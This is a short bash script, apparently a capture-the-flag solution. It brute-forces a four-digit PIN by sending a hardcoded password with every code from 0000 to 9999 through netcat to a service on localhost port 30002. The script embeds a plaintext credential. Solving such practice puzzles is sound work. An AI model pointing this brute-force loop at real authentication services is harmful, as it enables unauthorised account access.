#!/bin/bash

password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Open a single connection and send all attempts
{
  for i in $(seq -w 0000 9999); do
    echo "$password $i"
    sleep 0.01  # slight delay to avoid overwhelming the server
  done
} | nc localhost 30002



